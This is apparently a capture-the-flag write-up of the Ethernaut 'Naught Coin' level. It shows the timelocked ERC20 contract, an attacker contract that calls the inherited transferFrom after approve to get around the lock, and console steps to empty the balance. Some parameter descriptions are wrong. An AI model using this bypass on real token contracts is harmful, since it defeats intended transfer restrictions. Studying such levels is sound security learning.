# 15 Naught Coin

```
NaughtCoin is an ERC20 token and you're already holding all of them. The catch is that you'll only be able to transfer 
them after a 10 year lockout period. Can you figure out how to get them out to another address so that you can transfer them freely? 
Complete this level by getting your token balance to 0.

  Things that might help

The ERC20 Spec
The OpenZeppelin codebase
```
####  code
```

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import 'openzeppelin-contracts-08/token/ERC20/ERC20.sol';

 contract NaughtCoin is ERC20 {

  // string public constant name = 'NaughtCoin';
  // string public constant symbol = '0x0';
  // uint public constant decimals = 18;
  uint public timeLock = block.timestamp + 10 * 365 days;
  uint256 public INITIAL_SUPPLY;
  address public player;

  constructor(address _player) 
  ERC20('NaughtCoin', '0x0') {
    player = _player;
    INITIAL_SUPPLY = 1000000 * (10**uint256(decimals()));
    // _totalSupply = INITIAL_SUPPLY;
    // _balances[player] = INITIAL_SUPPLY;
    _mint(player, INITIAL_SUPPLY);
    emit Transfer(address(0), player, INITIAL_SUPPLY);
  }
  
  function transfer(address _to, uint256 _value) override public lockTokens returns(bool) {
    super.transfer(_to, _value);
  }

  // Prevent the initial owner from transferring tokens until the timelock has passed
  modifier lockTokens() {
    if (msg.sender == player) {
      require(block.timestamp > timeLock);
      _;
    } else {
     _;
    }
  } 
} 

```

#### Start 


### (1) `Getting our token balance to 0 `


You must know about the ERC20 Token and  Solidity and object oriented programming

I can't tell you all. You have to study by yourself from this link. 

ERC20 Token  -> https://github.com/ethereum/EIPs/blob/master/EIPS/eip-20.md

Solidity OOP -> https://medium.com/coinmonks/solidity-and-object-oriented-programming-oop-191f8deb8316

If you already know, let's get started.

.

.

.

Looking at the code, You can see  the contract NaughtCoin  Inheritance ERC20 from openzeppelin contracts

This means that the contract inherits all ERC20 openzeppelin functions.

Our goal is to make our blance = 0

You will see the code that prevents the function `transfer()` by `modifier lockTokens()` 

It meant  you cannot transfer money through this function.

The code shows just that, but keep in mind that you've inherited all the ERC20 openzeppelin functions, 

so you'll have the `transferFrom()` function available

We will use this function `transferFrom()` to transfer token by  approve the amount of token first. to be able to use

let's start

.

.

.

We need to write a contract

#### This is the code I used 
```

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface NaughtCoin  {
	function transferFrom(address from, address to,  uint256 amount) external  returns (bool) ;
  function allowance(address owner, address spender) external view  returns (uint256);
}

contract atkNaughtCoin {

  NaughtCoin public target;

  constructor(address _target ) {

    target = NaughtCoin(_target);

  }


  function callTransferForm(address _from, address _to, uint256 _amount)  external  { 
        target.transferFrom(_from,_to,_amount);

    }

  function callAllowance(address _owner ) external view returns(uint256){
      return  target.allowance(_owner,address(this));
    }
}

```


#### Open Developer Tools (F12)

- (1)  We will  check the total number of our coins first. type
  ```
  let t = await contract.balanceOf('our address')
  t.toString()
  ```
  you will see a message  `'1000000000000000000000000'`  that's the number of our coins in wei

- (2) We will approve the total amount of our coins for contract `atkNaughtCoin`

  type `await contract.approve('address contract atkNaughtCoin','1000000000000000000000000')` and confirm transaction

- (3) Next, we will call `function callTransferForm(address _from, address _to, uint256 _amount)  external` and put input 

    `_from` is the address we want to transfer coins to 
    
    `_to` is any address that we want to send coins to 
    
    `_amount` is the amount of coins we want to transfer.

   by call via remix and confirm transaction

Click button Submit instance and confirm transaction 

# !!! we passed !!!




